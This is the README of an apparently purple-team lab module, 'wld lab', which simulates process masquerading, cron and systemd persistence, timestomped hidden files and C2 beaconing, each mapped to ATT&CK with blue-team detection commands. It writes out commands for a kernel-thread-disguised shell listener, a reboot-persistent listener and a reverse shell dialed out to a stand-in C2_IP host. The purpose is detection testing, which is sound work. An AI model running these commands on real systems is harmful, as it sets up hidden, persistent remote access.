# wetland — purple-team lab module

`wld lab` is a small set of **documented, reversible** evasion / persistence
simulations for exercising detections in an **authorized lab**, in the spirit of
[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team). The goal is
**not** stealth — it is to generate *realistic, observable* telemetry so the blue
team can write and validate detections.

> ⚠️ **Authorized lab use only.** Every technique is intentionally loud, tags its
> artifacts with the string `WETLAND-LAB`, prints an ATT&CK-mapped detection
> hint after running, and can be fully removed with `wld lab uninstall`. Run it
> only on systems you own or are explicitly authorized to test. The module is
> POSIX-only (Linux/macOS); on Windows it is a no-op stub.

## Usage

```
wld lab <technique> [options]

  masquerade [--name NAME] [--duration SECS]
  persist    [--method cron|systemd|both] [--exec CMD]
  hide       [--dest PATH] [--reference /bin/ls]
  beacon      --to HOST[:PORT] [--interval S] [--jitter PCT] [--count N]
              [--size B] [--as raw|http|tls] [--profile hourly|aggressive|lowslow]
  uninstall
  detections

  <technique> -l [-i|-e C] also run a REAL listener via the client flow
```

`wld lab detections` prints the whole mapping below without executing anything.

### Running a real listener inside a technique (`-l`)

Any technique can also carry the full client flow — the same `-l` / `-l -g`
system as `wld -l` (meets at the configured relay) — so one command
both performs the TTP and serves a real, E2E-encrypted listener the blue team can
catch end to end. Short-dash flags (`-s -k -g -l -i -e -H -p -M …`) go to the
listener; the technique keeps its own `--long` flags.

| command | what runs |
|---------|-----------|
| `wld lab masquerade -s SEC -l -i`        | shell listener shown under the fake process name (T1036) |
| `wld lab beacon --to C2:443 -s SEC -l -i`| shell listener **plus** a background C2 beacon |
| `wld lab persist -s SEC -l -i`           | shell listener **persisted across reboots** (T1053.003/T1543.002) |
| `wld lab hide -s SEC -l -i`              | shell listener served **from the hidden dot-file** (T1564.001) |

- **persist -l** synthesises the persisted command from the serve flags (the
  listener persists *itself*), unless you pass an explicit `--exec`. Use `-s`/`-k`
  (not `-g`) so the secret is stable across reboots.
- **hide -l** drops the hidden, timestomped copy and then `execv`s it, so
  `ps`/`/proc/<pid>/exe` point at the dot-file — the realistic hidden-listener case.
- Every artifact stays tagged `WETLAND-LAB`, is announced on stderr, and is
  removed by `wld lab uninstall`. This is the loud, detectable lab form of a
  persistent/hidden C2 listener — the point is to generate the telemetry, not to
  hide. (For process-name hiding on the plain client, use `wld -l -M NAME`.)

---

## Techniques → detection mapping

### 1. Process masquerading — T1036.004 / T1036.005

```sh
wld lab masquerade --name "[kworker/0:0]" --duration 300
```

Sets the kernel-visible process name (`prctl(PR_SET_NAME)`) and overwrites the
contiguous `argv[]` region so `ps`, `top` and `/proc/<pid>/cmdline` all show the
fake name. Holds for `--duration` seconds so it is observable.

The same rename is available as an opt-in flag on the live client, **`-M NAME`**,
so a running listener is masqueraded instead of showing `./wld ...`:

```sh
wld -g -l -i -M "[kworker/0:0]"   # masqueraded C2 listener (real serving process)
```

This is the realistic case to detect — a masqueraded process that is actually a
remote-access listener. It is opt-in (plain `wld -l` is not masqueraded) and, as
below, still detectable via `/proc/<pid>/exe`.

**Blue team:**
- A process whose `comm` looks like a kernel thread (`[kworker/...]`, `[kthreadd]`)
  but has a real `/proc/<pid>/exe`, a writable heap/stack and mapped shared
  libraries. **Genuine kernel threads have none of these.**
- EDR: `argv[0]` not matching the backing executable; a `PR_SET_NAME` call.

```sh
for p in /proc/[0-9]*; do
  n=$(tr -d '\0' < "$p/comm")
  case "$n" in \[*\]) readlink "$p/exe" 2>/dev/null && echo "FAKE KTHREAD: $p ($n)";; esac
done
```

### 2. Persistence — T1053.003 (cron) / T1543.002 (systemd user service)

```sh
wld lab persist --method both            # harmless heartbeat payload by default
wld lab persist --method cron --exec "/path/to/thing"
```

- **cron:** adds a `@reboot … # WETLAND-LAB` line. The payload is written to the
  crontab as **literal bytes** (never through a shell), so it is not executed at
  install time.
- **systemd:** writes `~/.config/systemd/user/wetland-lab.service` and
  `systemctl --user enable --now` it (falls back to leaving the unit on disk if
  there is no user systemd session).

Default payload is a harmless heartbeat into `~/.wetland-lab.log` — swap it with
`--exec`.

**Blue team:**
```sh
crontab -l | grep WETLAND-LAB
systemctl --user list-unit-files | grep wetland-lab
```
- auditd/FIM: watch writes to `~/.config/systemd/user/` and to crontab spools
  (`/var/spool/cron/…`).

### 3. Hidden file + timestomp — T1564.001 / T1070.006

```sh
wld lab hide --reference /bin/ls
```

Copies the binary to an executable dot-file in `$HOME` (default `~/.wetland-lab`)
and copies the `mtime`/`atime` from a system binary onto it.

**Blue team:**
```sh
find ~ -maxdepth 1 -name '.*' -type f -perm -u+x
stat -c '%n mtime=%Y ctime=%Z' ~/.wetland-lab    # ctime >> mtime
```
- Timestomping can set `mtime`/`atime` but **not `ctime`** (inode change time),
  so a file whose `ctime` is far newer than its `mtime` is a strong signal.

### 4. C2 beaconing — T1071.001 / T1573 / T1571 / T1008

```sh
wld lab beacon --to c2.lab.local:443 --as http --profile hourly
wld lab beacon --to c2.lab.local:443 --as tls  --interval 30 --jitter 20
wld lab beacon --to c2.lab.local:8443 --as raw --profile aggressive
```

Models a **centralized C2** check-in: the implant connects out to a C2 server on
a fixed cadence (± jitter) and sends a short payload. `--as` shapes the traffic
so blue can exercise different detections; `--profile` sets the cadence.

| `--as` | On the wire | Primary detection |
|--------|-------------|-------------------|
| `raw`  | opaque random bytes | bytes on the port with **no protocol** a parser recognises (e.g. no TLS handshake on 443) |
| `http` | `GET /<hex> HTTP/1.1` + fixed browser `User-Agent` | static UA, odd URI, request with no browser-like follow-up |
| `tls`  | TLS-ClientHello-**shaped** bytes (`16 03 01 …`) | a ClientHello no real client sent → **JA3/JARM** mismatch |

| `--profile` | interval | jitter |
|-------------|----------|--------|
| `aggressive` | 10 s | 30 % |
| `hourly` | 3600 s | 15 % |
| `lowslow` | 1800 s | 50 % |

`--interval` / `--jitter` override a profile. **None of this is real TLS/HTTP** —
only the shape is there, which is the point: the shape drives the detection.

**Blue team:**
- NetFlow/Zeek: beaconing by connection-interval regularity even with jitter;
  low bytes-up / bytes-down ratio; many short-lived sessions to one rare dst IP.
- `as=tls`: JA3/JARM allow-listing flags the odd ClientHello; `as=http`: UA + URI
  entropy; `as=raw` on 443: bytes with no TLS handshake at all.
- `T1571`: a C2 port that does not match its apparent protocol (raw/tls on an odd
  port, or plaintext HTTP on 443).

---

## Scenario: centralized C2 end-to-end

The pieces above compose into a full **centralized-C2 exercise** using wetland
itself — the relay plays the **C2 server** and `wld` plays the **implant**, all on
lab-controlled hosts (no public tunnel or VPS needed; the C2 just has to be
reachable from the implant).

```sh
# 1) C2 server — on a lab box the implant can reach
wetland-relay -p 7440 -v

# 2) implant host — beacon out to the C2 (the detection signal)
wld lab beacon --to C2_IP:7440 --as tls --profile hourly

# 3) implant host — the actual egress channel / "tasking":
#    an E2E-encrypted reverse shell dialed OUT to the same C2
wld -s <secret> -l -i -H C2_IP -p 7440     # implant serves a shell
# 4) operator — from anywhere that can reach the C2
wld -s <secret> -i -H C2_IP -p 7440        # gets the shell
```

ATT&CK: T1571/T1071/T1573 (the beacon + channel), T1090 (the relay as a proxy
hop), T1219/T1059 (interactive shell). What blue should catch: the periodic
check-ins, the long-lived outbound session to the C2, and — since the relay only
ever sees the 16-byte address + ciphertext — the fact that payload inspection is
blind, so **detection must lean on behaviour** (beaconing, destination rarity,
session duration) rather than content.

---

## Cleanup

```sh
wld lab uninstall
```

Removes every `WETLAND-LAB`-tagged artifact: cron marker lines, the systemd user
unit (disabling it first), the dropped dot-file and the heartbeat log. Masquerade
and beacon leave nothing on disk — they end when the process exits.

## Safety model

- All techniques live behind the explicit `wld lab …` subcommand; the normal
  client path is untouched.
- Artifacts are tagged and reversible; payloads default to harmless heartbeats.
- Techniques are tuned to be *detectable*, not covert. This is deliberately a
  poor base for a real implant — that is the point.
